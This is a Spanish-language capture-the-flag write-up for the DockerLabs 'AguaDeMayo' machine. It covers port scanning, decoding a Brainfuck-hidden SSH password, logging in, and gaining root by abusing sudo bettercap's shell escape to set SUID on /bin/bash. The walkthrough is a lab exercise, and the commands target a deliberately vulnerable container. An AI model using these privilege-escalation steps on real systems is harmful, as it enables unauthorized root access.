---
icon: flag
---

# AaguaDeMayo DockerLabs (Easy)

### Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip aduademayo.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh aguademayo.tar
```

Info:

```
Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-06 08:22 EDT
Nmap scan report for 172.17.0.2
Host is up (0.000031s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 75:ec:4d:36:12:93:58:82:7b:62:e3:52:91:70:83:70 (ECDSA)
|_  256 8f:d8:0f:2c:4b:3e:2b:d7:3c:a2:83:d3:6d:3f:76:aa (ED25519)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.59 (Debian)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.70 seconds
```

### Gobuster

```shell
```

Info:

```
```

Vemos que hay un directorio llamado `/images` si vamos ahi hay una imagen sospechosa llamada `agua_ssh.jpg` pero aparentemente no hay gran cosa, si vemos el codigo de la pagina de `apache2` veremos lo siguiente.

```
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>++++++.>+++++++++++..----.<<++.>>-------.+..+++++++++++.<<.>>-------.+++++.++++++.-----.<<.>>-.-------------.+++++++++++++++++++.+.---.-------------.<<.>>----.+++++++++++++.----------.<<.>>++++++++++++++++.------------.---.+++++++++.<<.>>+++++++++++.----------.++++++.<<.>>++.--------------.+++..<<.>>+++++++++.-------.----------.+.+++++++++++++.+.+.-------------------.+++++++++++++.----------.<<.>>+.+++++++++++++++++.-----------------.+++++++++++++.+++++++.-----.------------.+.+++++.-------.<<.>>-----.+++.+++++++++++++++..---------------.+++++++++++++.<<++++++++++++++.------------.
```

Un codigo de encriptacion `Brainfuck` y si lo desencriptamos dira algo como...

```
bebeaguaqueessano
```

Por lo que podria ser una posible contraseña y si probamos como nombre de usuario `agua` como pone en la imagen.

```shell
ssh agua@<IP>
```

Y como contraseña `bebeaguaqueessano` veremos que entramos dentro de la maquina.

> Credentials

```
User = agua
Pass = bebeaguaqueessano
```

### Privilege Escalation

Si hacemos `sudo -l` veremos lo siguiente.

```
Matching Defaults entries for agua on 29a2587cdbbf:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User agua may run the following commands on 29a2587cdbbf:
    (root) NOPASSWD: /usr/bin/bettercap
```

Y si lo iniciamos.

```shell
sudo bettercap
```

Nos metera en una shell del binario, pero si hacemos `help` veremos lo siguiente.

```
help MODULE : List available commands or show module specific help if no module name is provided.
                active : Show information about active modules.
                  quit : Close the session and exit.
         sleep SECONDS : Sleep for the given amount of seconds.
              get NAME : Get the value of variable NAME, use * alone for all, or NAME* as a wildcard.
        set NAME VALUE : Set the VALUE of variable NAME.
  read VARIABLE PROMPT : Show a PROMPT to ask the user for input that will be saved inside VARIABLE.
                 clear : Clear the screen.
        include CAPLET : Load and run this caplet in the current session.
             ! COMMAND : Execute a shell command and print its output.
        alias MAC NAME : Assign an alias to a given endpoint given its MAC address.
```

Por lo que vemos podemos ejecutar comandos del sistema poniendo `!` delante de cada comando, por lo que si hacemos.

```shell
!chmod +s /bin/bash
```

Añadiremos `SUID` a la `bash` por lo que si nos salimos de ahi y ponemos.

```shell
bash -p
```

Seremos `root`.
